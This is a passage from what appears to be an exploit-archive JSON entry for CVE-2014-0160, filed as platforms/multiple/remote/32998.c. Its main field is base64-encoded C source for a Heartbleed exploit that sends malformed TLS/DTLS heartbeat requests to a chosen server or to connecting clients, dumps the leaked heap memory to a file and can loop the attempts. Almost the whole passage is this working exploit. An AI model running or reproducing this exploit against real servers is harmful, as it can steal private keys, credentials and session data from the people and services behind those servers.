pZihvdXRwdXQgPiAwKXsNCgkJaW50IGZkID0gb3BlbihmaWxlbmFtZSxPX1JEV1J8T19DUkVBVHxPX0FQUEVORCwwNzAwKTsNCgkgICAgICAgIGlmKGZpcnN0PT0yKXsNCgkJCWZpcnN0LS07DQoJCQl3cml0ZShmZCxzLT5zMy0+cnJlYy5kYXRhKzMscy0+czMtPnJyZWMubGVuZ3RoKTsNCgkJCS8qIGZpcnN0IHRocmVlIGJ5dGVzIGFyZSByZXNwK2xlbiAqLw0KCQkJcHJpbnRmKCJbIHdyb3RlICVkIGJ5dGVzIG9mIGhlYXAgdG8gZmlsZSAnJXMnXG4iLHMtPnMzLT5ycmVjLmxlbmd0aC0zLGZpbGVuYW1lKTsNCgkJfQ0KCQllbHNlew0KCQkJLyogaGVhcCBkYXRhICYgMTYgYnl0ZXMgcGFkZGluZyAqLw0KCQkJd3JpdGUoZmQscy0+czMtPnJyZWMuZGF0YSszLHMtPnMzLT5ycmVjLmxlbmd0aCk7DQoJCQlwcmludGYoIlsgd3JvdGUgJWQgYnl0ZXMgb2YgaGVhcCB0byBmaWxlICclcydcbiIscy0+czMtPnJyZWMubGVuZ3RoLGZpbGVuYW1lKTsNCgkJfQ0KCQljbG9zZShmZCk7DQoJfQ0KCWVsc2V7DQoJCXByaW50ZigiWyBub3RoaW5nIGZyb20gdGhlIGhlYXAgdG8gd3JpdGVcbiIpOw0KCX0NCg0KCQkJZHRsczFfc3RvcF90aW1lcihjLT5zc2xIYW5kbGUpOw0KCQkJYy0+c3NsSGFuZGxlLT50bHNleHRfaGJfc2VxKys7DQoJCQljLT5zc2xIYW5kbGUtPnRsc2V4dF9oYl9wZW5kaW5nID0gMDsNCg0KCXJldHVybjsNCmFwcGxlOg0KICAgICAgICBwcmludGYoIlsgcHJvYmxlbSBoYW5kbGluZyBTU0wgcmVjb3JkIHBhY2tldCAtIHdyb25nIHR5cGU/XG4iKTsNCgliYWRwYWNrZXRzKys7DQoJaWYoYmFkcGFja2V0cyA+IDMpew0KCQlwcmludGYoIlsgZXJyb3I6IHRvbyBtYW55IGJhZCBwYWNrZXRzIHJlY2lldmVkXG4iKTsNCgkJZXhpdCgwKTsNCgl9DQoJcmV0dXJuOw0KfQ0KDQpzdGF0aWMgRFRMUzFfQklUTUFQICoNCmR0bHMxX2dldF9iaXRtYXAoU1NMICpzLCBTU0wzX1JFQ09SRCAqcnIsIHVuc2lnbmVkIGludCAqaXNfbmV4dF9lcG9jaCkNCiAgICB7DQogICAgDQogICAgKmlzX25leHRfZXBvY2ggPSAwOw0KDQogICAgaWYgKHJyLT5lcG9jaCA9PSBzLT5kMS0+cl9lcG9jaCkNCiAgICAgICAgcmV0dXJuICZzLT5kMS0+Yml0bWFwOw0KDQogICAgZWxzZSBpZiAocnItPmVwb2NoID09ICh1bnNpZ25lZCBsb25nKShzLT5kMS0+cl9lcG9jaCArIDEpICYmDQogICAgICAgIChyci0+dHlwZSA9PSBTU0wzX1JUX0hBTkRTSEFLRSB8fA0KICAgICAgICAgICAgcnItPnR5cGUgPT0gU1NMM19SVF9BTEVSVCkpDQogICAgICAgIHsNCiAgICAgICAgKmlzX25leHRfZXBvY2ggPSAxOw0KICAgICAgICByZXR1cm4gJnMtPmQxLT5uZXh0X2JpdG1hcDsNCiAgICAgICAgfQ0KDQogICAgcmV0dXJuIE5VTEw7DQogICAgfQ0KDQpzdGF0aWMgaW50IGR0bHMxX3JlY29yZF9yZXBsYXlfY2hlY2soU1NMICpzLCBEVExTMV9CSVRNQVAgKmJpdG1hcCkNCgl7DQoJaW50IGNtcDsNCgl1bnNpZ25lZCBpbnQgc2hpZnQ7DQoJY29uc3QgdW5zaWduZWQgY2hhciAqc2VxID0gcy0+czMtPnJlYWRfc2VxdWVuY2U7DQoNCgljbXAgPSBzYXRzdWI2NGJlKHNlcSxiaXRtYXAtPm1heF9zZXFfbnVtKTsNCglpZiAoY21wID4gMCkNCgkJew0KCQltZW1jcHkgKHMtPnMzLT5ycmVjLnNlcV9udW0sc2VxLDgpOw0KCQlyZXR1cm4gMTsNCgkJfQ0KCXNoaWZ0ID0gLWNtcDsNCglpZiAoc2hpZnQgPj0gc2l6ZW9mKGJpdG1hcC0+bWFwKSo4KQ0KCQlyZXR1cm4gMDsNCgllbHNlIGlmIChiaXRtYXAtPm1hcCAmICgxVUw8PHNoaWZ0KSkNCgkJcmV0dXJuIDA7DQoNCgltZW1jcHkgKHMtPnMzLT5ycmVjLnNlcV9udW0sc2VxLDgpOw0KCXJldHVybiAxOw0KCX0NCg0KaW50IHNhdHN1YjY0YmUoY29uc3QgdW5zaWduZWQgY2hhciAqdjEsY29uc3QgdW5zaWduZWQgY2hhciAqdjIpDQp7CWludCByZXQsc2F0LGJydyxpOw0KDQoJaWYgKHNpemVvZihsb25nKSA9PSA4KSBkbw0KCXsJY29uc3QgdW5pb24geyBsb25nIG9uZTsgY2hhciBsaXR0bGU7IH0gaXNfZW5kaWFuID0gezF9Ow0KCQlsb25nIGw7DQoNCgkJaWYgKGlzX2VuZGlhbi5saXR0bGUpCQkJYnJlYWs7DQoNCgkJaWYgKCgoc2l6ZV90KXYxfChzaXplX3QpdjIpJjB4NykJYnJlYWs7DQoNCgkJbCAgPSAqKChsb25nICopdjEpOw0KCQlsIC09ICooKGxvbmcgKil2Mik7DQoJCWlmIChsPjEyOCkJCXJldHVybiAxMjg7DQoJCWVsc2UgaWYgKGw8LTEyOCkJcmV0dXJuIC0xMjg7DQoJCWVsc2UJCQlyZXR1cm4gKGludClsOw0KCX0gd2hpbGUgKDApOw0KDQoJcmV0ID0gKGludCl2MVs3XS0oaW50KXYyWzddOw0KCXNhdCA9IDA7DQoJYnJ3ID0gcmV0Pj44Ow0KCWlmIChyZXQgJiAweDgwKQ0KCXsJZm9yIChpPTY7aT49MDtpLS0pDQoJCXsJYnJ3ICs9IChpbnQpdjFbaV0tKGludCl2MltpXTsNCgkJCXNhdCB8PSB+YnJ3Ow0KCQkJYnJ3ID4+PSA4Ow0KCQl9DQoJfQ0KCWVsc2UNCgl7CWZvciAoaT02O2k+PTA7aS0tKQ0KCQl7CWJydyArPSAoaW50KXYxW2ldLShpbnQpdjJbaV07DQoJCQlzYXQgfD0gYnJ3Ow0KCQkJYnJ3ID4+PSA4Ow0KCQl9DQoJfQ0KCWJydyA8PD0gODsNCg0KCWlmIChzYXQmMHhmZikJcmV0dXJuIGJydyB8IDB4ODA7DQoJZWxzZQkJcmV0dXJuIGJydyArIChyZXQmMHhGRik7DQp9DQoNCnN0YXRpYyBpbnQNCmR0bHMxX2J1ZmZlcl9yZWNvcmQoU1NMICpzLCByZWNvcmRfcHF1ZXVlICpxdWV1ZSwgdW5zaWduZWQgY2hhciAqcHJpb3JpdHkpDQoJew0KCURUTFMxX1JFQ09SRF9EQVRBICpyZGF0YTsNCglwaXRlbSAqaXRlbTsNCg0KCWlmIChwcXVldWVfc2l6ZShxdWV1ZS0+cSkgPj0gMTAwKQ0KCQlyZXR1cm4gMDsNCgkJDQoJcmRhdGEgPSBPUEVOU1NMX21hbGxvYyhzaXplb2YoRFRMUzFfUkVDT1JEX0RBVEEpKTsNCglpdGVtID0gcGl0ZW1fbmV3KHByaW9yaXR5LCByZGF0YSk7DQoJaWYgKHJkYXRhID09IE5VTEwgfHwgaXRlbSA9PSBOVUxMKQ0KCQl7DQoJCWlmIChyZGF0YSAhPSBOVUxMKSBPUEVOU1NMX2ZyZWUocmRhdGEpOw0KCQlpZiAoaXRlbSAhPSBOVUxMKSBwaXRlbV9mcmVlKGl0ZW0pOw0KCQkNCgkJU1NMZXJyKFNTTF9GX0RUTFMxX0JVRkZFUl9SRUNPUkQsIEVSUl9SX0lOVEVSTkFMX0VSUk9SKTsNCgkJcmV0dXJuKDApOw0KCQl9DQoJDQoJcmRhdGEtPnBhY2tldCA9IHMtPnBhY2tldDsNCglyZGF0YS0+cGFja2V0X2xlbmd0aCA9IHMtPnBhY2tldF9sZW5ndGg7DQoJbWVtY3B5KCYocmRhdGEtPnJidWYpLCAmKHMtPnMzLT5yYnVmKSwgc2l6ZW9mKFNTTDNfQlVGRkVSKSk7DQoJbWVtY3B5KCYocmRhdGEtPnJyZWMpLCAmKHMtPnMzLT5ycmVjKSwgc2l6ZW9mKFNTTDNfUkVDT1JEKSk7DQoNCglpdGVtLT5kYXRhID0gcmRhdGE7DQoNCiNpZm5kZWYgT1BFTlNTTF9OT19TQ1RQDQoJaWYgKEJJT19kZ3JhbV9pc19zY3RwKFNTTF9nZXRfcmJpbyhzKSkgJiYNCgkgICAgKHMtPnN0YXRlID09IFNTTDNfU1RfU1JfRklOSVNIRURfQSB8fCBzLT5zdGF0ZSA9PSBTU0wzX1NUX0NSX0ZJTklTSEVEX0EpKSB7DQoJCUJJT19jdHJsKFNTTF9nZXRfcmJpbyhzKSwgQklPX0NUUkxfREdSQU1fU0NUUF9HRVRfUkNWSU5GTywgc2l6ZW9mKHJkYXRhLT5yZWNvcmRpbmZvKSwgJnJkYXRhLT5yZWNvcmRpbmZvKTsNCgl9DQojZW5kaWYNCg0KCWlmIChwcXVldWVfaW5zZXJ0KHF1ZXVlLT5xLCBpdGVtKSA9PSBOVUxMKQ0KCQl7DQoJCU9QRU5TU0xfZnJlZShyZGF0YSk7DQoJCXBpdGVtX2ZyZWUoaXRlbSk7DQoJCXJldHVybigwKTsNCgkJfQ0KDQoJcy0+cGFja2V0ID0gTlVMTDsNCglzLT5wYWNrZXRfbGVuZ3RoID0gMDsNCgltZW1zZXQoJihzLT5zMy0+cmJ1ZiksIDAsIHNpemVvZihTU0wzX0JVRkZFUikpOw0KCW1lbXNldCgmKHMtPnMzLT5ycmVjKSwgMCwgc2l6ZW9mKFNTTDNfUkVDT1JEKSk7DQoJDQoJaWYgKCFzc2wzX3NldHVwX2J1ZmZlcnMocykpDQoJCXsNCgkJU1NMZXJyKFNTTF9GX0RUTFMxX0JVRkZFUl9SRUNPUkQsIEVSUl9SX0lOVEVSTkFMX0VSUk9SKTsNCgkJT1BFTlNTTF9mcmVlKHJkYXRhKTsNCgkJcGl0ZW1fZnJlZShpdGVtKTsNCgkJcmV0dXJuKDApOw0KCQl9DQoJDQoJcmV0dXJuKDEpOw0KCX0NCg0KDQpzdGF0aWMgdm9pZCBkdGxzMV9yZWNvcmRfYml0bWFwX3VwZGF0ZShTU0wgKnMsIERUTFMxX0JJVE1BUCAqYml0bWFwKQ0KCXsNCglpbnQgY21wOw0KCXVuc2lnbmVkIGludCBzaGlmdDsNCgljb25zdCB1bnNpZ25lZCBjaGFyICpzZXEgPSBzLT5zMy0+cmVhZF9zZXF1ZW5jZTsNCg0KCWNtcCA9IHNhdHN1YjY0YmUoc2VxLGJpdG1hcC0+bWF4X3NlcV9udW0pOw0KCWlmIChjbXAgPiAwKQ0KCQl7DQoJCXNoaWZ0ID0gY21wOw0KCQlpZiAoc2hpZnQgPCBzaXplb2YoYml0bWFwLT5tYXApKjgpDQoJCQliaXRtYXAtPm1hcCA8PD0gc2hpZnQsIGJpdG1hcC0+bWFwIHw9IDFVTDsNCgkJZWxzZQ0KCQkJYml0bWFwLT5tYXAgPSAxVUw7DQoJCW1lbWNweShiaXRtYXAtPm1heF9zZXFfbnVtLHNlcSw4KTsNCgkJfQ0KCWVsc2UJew0KCQlzaGlmdCA9IC1jbXA7DQoJCWlmIChzaGlmdCA8IHNpemVvZihiaXRtYXAtPm1hcCkqOCkNCgkJCWJpdG1hcC0+bWFwIHw9IDFVTDw8c2hpZnQ7DQoJCX0NCgl9DQoNCg0Kdm9pZCB1c2FnZSgpew0KCXByaW50ZigiW1xuIik7DQoJcHJpbnRmKCJbIC0tc2VydmVyfC1zIDxpcC9kbnM+ICAgIC0gdGhlIHNlcnZlciB0byB0YXJnZXRcbiIpOw0KCXByaW50ZigiWyAtLXBvcnR8LXAgICA8cG9ydD4gICAgICAtIHRoZSBwb3J0IHRvIHRhcmdldFxuIik7DQoJcHJpbnRmKCJbIC0tZmlsZXwtZiAgIDxmaWxlbmFtZT4gIC0gZmlsZSB0byB3cml0ZSBkYXRhIHRvXG4iKTsNCglwcmludGYoIlsgLS1iaW5kfC1iICAgPGlwPiAgICAgICAgLSBiaW5kIHRvIGlwIGZvciBleHBsb2l0aW5nIGNsaWVudHNcbiIpOw0KCXByaW50ZigiWyAtLXByZWNtZHwtYyA8bj4gICAgICAgICAtIHNlbmQgcHJlY21kIGJ1ZmZlciAoU1RBUlRUTFMpXG4iKTsNCglwcmludGYoIlsJCQkgICAgMCA9IFNNVFBcbiIpOw0KCXByaW50ZigiWwkJCSAgICAxID0gUE9QM1xuIik7DQoJcHJpbnRmKCJbCQkJICAgIDIgPSBJTUFQXG4iKTsNCglwcmludGYoIlsgLS1sb29wfC1sCQkgIC0gbG9vcCB0aGUgZXhwbG9pdCBhdHRlbXB0c1xuIik7DQoJcHJpbnRmKCJbIC0tdHlwZXwtdCAgIDxuPiAgICAgICAgIC0gc2VsZWN0IGV4cGxvaXQgdG8gdHJ5XG4iKTsNCglwcmludGYoIlsgICAgICAgICAgICAgICAgICAgICAgICAgICAwID0gbnVsbCBsZW5ndGhcbiIpOw0KCXByaW50ZigiWwkJCSAgICAxID0gbWF4IGxlYWtcbiIpOw0KCXByaW50ZigiWwkJCSAgICBuID0gaGVhcnRiZWF0IHBheWxvYWRfbGVuZ3RoXG4iKTsNCglwcmludGYoIlsgLS11ZHB8LXUgICAgICAgICAgICAgICAtIHVzZSBkdGxzL3VkcFxuIik7DQoJcHJpbnRmKCJbXG4iKTsNCglwcmludGYoIlsgLS12ZXJib3NlfC12ICAgICAgICAgICAgLSBvdXRwdXQgbGVhayB0byBzY3JlZW5cbiIpOw0KCXByaW50ZigiWyAtLWhlbHB8LWggICAgICAgICAgICAgICAtIHRoaXMgb3V0cHV0XG4iKTsNCglwcmludGYoIltcbiIpOw0KCWV4aXQoMCk7DQp9DQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyKiBhcmd2W10pew0KCWludCByZXQsIHBvcnQsIHVzZXJjLCBpbmRleDsNCglpbnQgdHlwZSA9IDEsIHVkcCA9IDAsIHZlcmJvc2UgPSAwLCBiaW5kID0gMCwgcHJlY21kID0gOTsNCglpbnQgbG9vcCA9IDA7DQoJc3RydWN0IGhvc3RlbnQgKmg7DQoJY29ubmVjdGlvbiogYzsNCgljaGFyICpob3N0LCAqZmlsZTsNCglpbnQgaWhvc3QgPSAwLCBpcG9ydCA9IDAsIGlmaWxlID0gMCwgaXR5cGUgPSAwLCBpcHJlY21kID0gMDsNCglwcmludGYoIlsgaGVhcnRibGVlZCAtIENWRS0yMDE0LTAxNjAgLSBPcGVuU1NMIGluZm9ybWF0aW9uIGxlYWsgZXhwbG9pdFxuIik7DQoJcHJpbnRmKCJbID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cbiIpOw0KICAgICAgICBzdGF0aWMgc3RydWN0IG9wdGlvbiBvcHRpb25zW10gPSB7DQogICAgICAgIAl7InNlcnZlciIsIDEsIDAsICdzJ30sDQoJICAgICAgICB7InBvcnQiLCAxLCAwLCAncCd9LA0KCQl7ImZpbGUiLCAxLCAwLCAnZid9LA0KCQl7InR5cGUiLCAxLCAwLCAndCd9LA0KCQl7ImJpbmQiLCAxLCAwLCAnYid9LA0KCQl7InZlcmJvc2UiLCAwLCAwLCAndid9LA0KCQl7InByZWNtZCIsIDEsIDAsICdjJ30sDQoJCXsibG9vcCIsIDAsIDAsICdsJ30sDQoJCXsiaGVscCIsIDAsIDAsJ2gnfSwNCgkJeyJ1ZHAiLCAwLCAwLCAndSd9DQogICAgICAgIH07DQoJd2hpbGUodXNlcmMgIT0gLTEpIHsNCgkgICAgICAgIHVzZXJjID0gZ2V0b3B0X2xvbmcoYXJnYyxhcmd2LCJzOnA6Zjp0OmI6Yzpsdmh1IixvcHRpb25zLCZpbmRleCk7CQ0KICAgICAgICAJc3dpdGNoKHVzZXJjKSB7DQogICAgICAgICAgICAgICAJCWNhc2UgLTE6DQoJICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIAkgICAgICAgIGNhc2UgJ3MnOg0KCQkJCWlmKGlob3N0PT0wKXsNCgkJCQkJaWhvc3QgPSAxOw0KCQkJCQloID0gZ2V0aG9zdGJ5bmFtZShvcHRhcmcpOwkJCQkNCgkJCQkJaWYoaD09TlVMTCl7DQoJCQkJCQlwcmludGYoIlshXSBGQVRBTDogdW5rbm93biBob3N0ICclcydcbiIsb3B0YXJnKTsNCgkJCQkJCWV4aXQoMSk7DQoJCQkJCX0NCgkJCQkJaG9zdCA9IG1hbGxvYyhzdHJsZW4ob3B0YXJnKSArIDEpOw0KCQkJCQlpZihob3N0PT1OVUxMKXsNCiAgICAgICAgICAgICAgICAJCQkJcHJpbnRmKCJbIGVycm9yIGluIG1hbGxvYygpXG4iKTsNCgkJCQkgICAgICAgICAgICAgICAgZXhpdCgwKTsNCiAgICAgICAgCQkJCX0NCgkJCQkJc3ByaW50Zihob3N0LCIlcyIsb3B0YXJnKTsNCiAgICAgICAgICAgICAgIAkJCX0NCgkJCQlicmVhazsNCgkgICAgICAgICAgICAgICAgY2FzZSAncCc6DQoJCQkJaWYoaXBvcnQ9PTApew0KCQkJCQlwb3J0ID0gYXRvaShvcHRhcmcpOw0KCQkJCQlpcG9ydCA9IDE7DQoJCQkJfQ0KICAgICAgICAgICAgICAgIAkgICAgICAgIGJyZWFrOw0KCQkJY2FzZSAnZic6DQoJCQkJaWYoaWZpbGU9PTApew0KCQkJCQlmaWxlID0gbWFsbG9jKHN0cmxlbihvcHRhcmcpICsgMSk7DQoJCQkJCWlmKGZpbGU9PU5VTEwpew0KCQkJCSAgICAgICAgICAgICAgICBwcmludGYoIlsgZXJyb3IgaW4gbWFsbG9jKClcbiIpOw0KICAgICAgICAgICAgICAgIAkJCQlleGl0KDApOw0KICAgICAgICAJCQkJfQ0KCQkJCQlzcHJpbnRmKGZpbGUsIiVzIixvcHRhcmcpOw0KCQkJCQlpZmlsZSA9IDE7DQoJCQkJfQ0KCQkJCWJyZWFrOw0KCQkJY2FzZSAndCc6DQoJCQkJaWYoaXR5cGU9PTApew0KCQkJCQl0eXBlID0gYXRvaShvcHRhcmcpOw0KCQkJCQlpdHlwZSA9IDE7DQoJCQkJfQ0KCQkJCWJyZWFrOw0KCQkJY2FzZSAnaCc6DQoJCQkJdXNhZ2UoKTsNCgkJCQlicmVhazsNCgkJCWNhc2UgJ2InOg0KCQkJCWlmKGlob3N0PT0wKXsNCgkJCQkJaWhvc3QgPSAxOw0KCQkJCQlob3N0ID0gbWFsbG9jKHN0cmxlbihvcHRhcmcpKzEpOw0KCQkJCQlpZihob3N0PT1OVUxMKXsNCgkJCSAJICAgICAgICAgICAgICAgIHByaW50ZigiWyBlcnJvciBpbiBtYWxsb2MoKVxuIik7DQoJCQkJICAgICAgICAgICAgICAgIGV4aXQoMCk7DQoJCQkJICAgICAgICB9DQoJCQkJCXNwcmludGYoaG9zdCwiJXMiLG9wdGFyZyk7DQoJCQkJCWJpbmQgPSAxOw0KCQkJCX0NCgkJCQlicmVhazsNCgkJCWNhc2UgJ2MnOg0KCQkJCWlmKGlwcmVjbWQgPT0gMCl7DQoJCQkJCWlwcmVjbWQgPSAxOw0KCQkJCQlwcmVjbWQgPSBhdG9pKG9wdGFyZyk7DQoJCQkJfQ0KCQkJCWJyZWFrOw0KCQkJY2FzZSAndic6DQoJCQkJdmVyYm9zZSA9IDE7DQoJCQkJYnJlYWs7DQoJCQljYXNlICdsJzoNCgkJCQlsb29wID0gMTsNCgkJCQlicmVhazsNCiAgICAgICAgCSAgICAgICAgY2FzZSAndSc6DQoJCQkJdWRwID0gMTsNCgkJCQlicmVhazsNCg0KCQkJZGVmYXVsdDoNCgkJCQlicmVhazsNCgkJfQ0KCX0NCglpZihpaG9zdD09MHx8aXBvcnQ9PTB8fGlmaWxlPT0wfHxpdHlwZT09MCl7DQoJCXByaW50ZigiWyB0cnkgLS1oZWxwXG4iKTsNCgkJZXhpdCgwKTsNCgl9DQoJc3NsX2luaXQoKTsNCglpZihiaW5kPT0wKXsNCgkJaWYgKHVkcCl7DQoJCQljID0gZHRsc19jbGllbnQocmV0LCBob3N0LCBwb3J0KTsNCgkJCWR0bHNoZWFydGJsZWVkKGMsIHR5cGUpOw0KCQkJZHRsc3NuZWFreWxlYWt5KGMsZmlsZSx2ZXJib3NlKTsNCgkJCXdoaWxlKHJlcGVhdD09MSl7DQoJCQkJZHRsc3NuZWFreWxlYWt5KGMsZmlsZSx2ZXJib3NlKTsNCgkJCX0NCgkJCXdoaWxlKGxvb3A9PTEpew0KCQkJCXByaW50ZigiWyBlbnRlcmVkIGhlYXJ0YmxlZWQgbG9vcFxuIik7DQoJCQkJZmlyc3Q9MDsNCgkJCQlyZXBlYXQ9MTsNCgkJCQlkdGxzaGVhcnRibGVlZChjLHR5cGUpOw0KCQkJCXdoaWxlKHJlcGVhdD09MSl7DQoJCQkJCWR0bHNzbmVha3lsZWFreShjLGZpbGUsdmVyYm9zZSk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCWVsc2Ugew0KCQkJcmV0ID0gdGNwX2Nvbm5lY3QoaG9zdCwgcG9ydCk7DQoJCQlwcmVfY21kKHJldCwgcHJlY21kLCB2ZXJib3NlKTsNCgkJCWMgPSB0bHNfY29ubmVjdChyZXQpOw0KCQkJaGVhcnRibGVlZChjLHR5cGUpOw0KCQkJd2hpbGUocmVwZWF0PT0xKXsNCgkJCQlzbmVha3lsZWFreShjLGZpbGUsdmVyYm9zZSk7DQoJCQl9DQoJCQl3aGlsZShsb29wPT0xKXsNCgkJCQlwcmludGYoIlsgZW50ZXJlZCBoZWFydGJsZWVkIGxvb3BcbiIpOw0KCQkJCWZpcnN0PTA7DQoJCQkJcmVwZWF0PTE7DQoJCQkJaGVhcnRibGVlZChjLHR5cGUpOw0KCQkJCXdoaWxlKHJlcGVhdD09MSl7DQoJCQkJCXNuZWFreWxlYWt5KGMsZmlsZSx2ZXJib3NlKTsNCgkJCQl9DQoJCQl9DQoJCX0NCg0KCQlTU0xfc2h1dGRvd24oYy0+c3NsSGFuZGxlKTsNCgkJY2xvc2UgKHJldCk7DQoJCVNTTF9mcmVlKGMtPnNzbEhhbmRsZSk7DQoJfQ0KCWVsc2V7DQoJCWludCBzZCwgcGlkLCBpOw0KCQlpZiAodWRwKSB7DQoJCQljID0gZHRsc19zZXJ2ZXIoc2QsIGhvc3QsIHBvcnQpOw0KCQkJd2hpbGUgKDEpIHsNCgkJCQljaGFyICogYnl0ZXMgPSBtYWxsb2MoMTAyNCk7DQoJCQkJc3RydWN0IHNvY2thZGRyX2luIHBlZXI7DQoJCQkJc29ja2xlbl90IGxlbiA9IHNpemVvZihwZWVyKTsNCgkJCQkJaWYgKHJlY3Zmcm9tKGMtPnNvY2tldCxieXRlcywxMDIzLDAsKHN0cnVjdCBzb2NrYWRkciAqKSZwZWVyLCZsZW4pID4gMCkgew0KCQkJCQlkdGxzaGVhcnRibGVlZChjLHR5cGUpOw0KCQkJCQlkdGxzc25lYWt5bGVha3koYyxmaWxlLHZlcmJvc2UpOw0KCQkJCQkJd2hpbGUobG9vcD09MSl7DQoJCQkJCQkJcHJpbnRmKCJbIGVudGVyZWQgaGVhcnRibGVlZCBsb29wXG4iKTsNCgkJCQkJCQlmaXJzdD0wOw0KCQkJCQkJCXJlcGVhdD0wOw0KCQkJCQkJCWR0bHNoZWFydGJsZWVkKGMsdHlwZSk7DQoJCQkJCQkJd2hpbGUocmVwZWF0PT0xKXsNCgkJCQkJCQkJZHRsc3NuZWFreWxlYWt5KGMsZmlsZSx2ZXJib3NlKTsNCgkJCQkJCQl9DQoJCQkJCQl9DQoJCQkJCX0NCgkJCX0NCgkJfQ0KCQllbHNlIHsNCgkJCXJldCA9IHRjcF9iaW5kKGhvc3QsIHBvcnQpOw0KCQkJd2hpbGUoMSl7DQoJICAgICAgCQkJc2Q9YWNjZXB0KHJldCwwLDApOw0KCQkJCWlmKHNkPT0tMSl7DQoJCQkJCXByaW50ZigiWyFdIEZBVEFMOiBwcm9ibGVtIHdpdGggYWNjZXB0KClcbiIpOw0KCQkJCQlleGl0KDApOw0KCQkJCX0NCgkJCQlpZihwaWQ9Zm9yaygpKXsNCgkJCQkJY2xvc2Uoc2QpOw0KCQkJCX0NCgkgICAgICAJCQllbHNlew0KCQkJCQljID0gdGxzX2JpbmQoc2QpOw0KCQkJCQlwcmVfY21kKHJldCwgcHJlY21kLCB2ZXJib3NlKTsNCgkJCQkJaGVhcnRibGVlZChjLHR5cGUpOw0KCQkJCQl3aGlsZShyZXBlYXQ9PTEpew0KCQkJCQkJc25lYWt5bGVha3koYyxmaWxlLHZlcmJvc2UpOw0KCQkJCQl9DQoJCQkJCXdoaWxlKGxvb3A9PTEpew0KCQkJCQkJcHJpbnRmKCJbIGVudGVyZWQgaGVhcnRibGVlZCBsb29wXG4iKTsNCgkJCQkJCWZpcnN0PTA7DQoJCQkJCQlyZXBlYXQ9MDsNCgkJCQkJCWhlYXJ0YmxlZWQoYyx0eXBlKTsNCgkJCQkJCXdoaWxlKHJlcGVhdD09MSl7DQoJCQkJCQkJc25lYWt5bGVha3koYyxmaWxlLHZlcmJvc2UpOw0KCQkJCQkJfQ0KCQkJCQl9DQoJCQkJCXByaW50ZigiWyBkb25lLlxuIik7DQoJCQkJCWV4aXQoMCk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJfQ0KfQ==", 
    "filename": "platforms/multiple/remote/32998.c", 
    "id": "32998", 
    "cves": [
        "CVE-2014-0160"
    ]
}